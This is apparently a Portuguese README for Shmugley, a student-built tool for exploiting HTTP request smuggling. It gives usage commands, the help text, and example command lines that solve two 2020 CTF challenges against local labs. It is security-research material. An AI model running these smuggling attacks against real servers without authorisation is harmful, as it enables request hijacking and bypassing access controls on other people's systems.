# Shmugley
Shmugley é uma ferramenta que ajuda a explorar a vulnerabilidade de HTTP request smuggling. É baseada no número de respostas do servidor, então pode acabar mostrando falso positivos, principalmente se usar o modo CLTE, a ferramenta também avisa quando tem um timeout na requisição, isso pode ajudar na exploração.

A parte de tratar requisições foi levemente modificada do projeto [Smuggler](https://github.com/defparam/smuggler).

# Utilização
Basicamente é preciso definir cada requisição que será feita no smuggling, existem as opções `-Hn` que define os headers do n-ésimo request, `-Xn` que define o método e `--one`, `--two`, até `--five` que define o caminho, se o caminho for `404` ele tentará buscar um erro 404 no servidor.

```sh
python shmugley.py http://127.0.0.1/ --one 404 --two / -X1 GET -X2 PATCH
```

Também existe a opção `--request arquivo` que le o `arquivo` e usa ele como base dos requests.

```sh
python shmugley.py http://127.0.0.1/ --request request.txt
```

Por padrão alguns payloads de `Transfer-Encoding` estão disponíveis, mas pode ser que eles não sejam os melhores, então também tem como passar um dicionário para a exploração. Aí todos os payloads contendo no dicionário vão ser executados em ordem.
```sh
python shmugley.py http://127.0.0.1/ dictionary
```

Se precisar ver outras opções é só rodar o script sem nenhum argumento.

```sh
$ python shmugley.py
usage: shmugley.py [-h] [--crlf CRLF] [--request REQUEST] [--random-agent] [--one ONE] [--two TWO] [--three THREE] [--four FOUR] [--five FIVE] [-a ALIGN] [-k]
                   [-v VERBOSE] [-o OUTPUT] [-m {clte,tete,tecl}] [-t CONNECT_TIMEOUT] [-f FILTER] [-s] [-bs] [-H1 HEADER1] [-X1 METHOD1] [-H2 HEADER2]
                   [-X2 METHOD2] [-H3 HEADER3] [-X3 METHOD3] [-H4 HEADER4] [-X4 METHOD4] [-H5 HEADER5] [-X5 METHOD5]
                   url [dictionary]

positional arguments:
  url                   target
  dictionary            custom payloads, to use bytes, prefix with \x

optional arguments:
  -h, --help            show this help message and exit
  --crlf CRLF           CRLF to be used (default rn) [options rn and n]
  --request REQUEST     raw request file
  --random-agent        use random user-agent
  --one ONE             first request specifier
  --two TWO             second request specifier
  --three THREE         third request specifier
  --four FOUR           fourth request specifier
  --five FIVE           fifth request specifier
  -a ALIGN, --align ALIGN
                        send a alignment request after the payload
  -k, --insecure        ignore ssl
  -v VERBOSE, --verbose VERBOSE
                        verbose mode (default: 0)
  -o OUTPUT, --output OUTPUT
                        output file (every request outputs according to verbose)
  -m {clte,tete,tecl}, --mode {clte,tete,tecl}
                        mode of operation
  -t CONNECT_TIMEOUT, --connect-timeout CONNECT_TIMEOUT
                        set timeout (default 10)
  -f FILTER, --filter FILTER
                        show payloads that contains this filter
  -s, --stop            stop on first possible find
  -bs, --binary-search  try to use binary search on content-length, when on clte mode (second request only).
  -H1 HEADER1, --header1 HEADER1
                        custom request 1 headers
  -X1 METHOD1, --method1 METHOD1
                        method for request 1 (default: POST)
  -H2 HEADER2, --header2 HEADER2
                        custom request 2 headers
  -X2 METHOD2, --method2 METHOD2
                        method for request 2 (default: POST)
  -H3 HEADER3, --header3 HEADER3
                        custom request 3 headers
  -X3 METHOD3, --method3 METHOD3
                        method for request 3 (default: POST)
  -H4 HEADER4, --header4 HEADER4
                        custom request 4 headers
  -X4 METHOD4, --method4 METHOD4
                        method for request 4 (default: POST)
  -H5 HEADER5, --header5 HEADER5
                        custom request 5 headers
  -X5 METHOD5, --method5 METHOD5
                        method for request 5 (default: POST)

```

# Exemplos
Existem dois labs baseados em desafios de CTF, um da defcon quals e outro do spamandhex.

Para resolver o desafio uploooadit da defcon quals 2020:
```sh
python shmugley.py http://127.0.0.1:8080 -m clte -X1 GET --two /files/ -H2 "X-guid: 04e7a49f-f5d3-46cb-86b2-e852b27c9029" -H2 "Content-Type: text/plain" -H2 "Content-Length: 289" -a /files/04e7a49f-f5d3-46cb-86b2-e852b27c9029 -v 3
```

Para resolver o desafio babywaf do spamandhex 2020:

```sh
python main.py -m tecl http://127.0.0.1:8080 -X1 GET -X2 GET --one 404 --two /flag -a / -v3
```

# Labs
Para executar os labs leia o `README.md` do que você deseja executar.

### Esse foi o meu projeto de NM do GRIS/UFRJ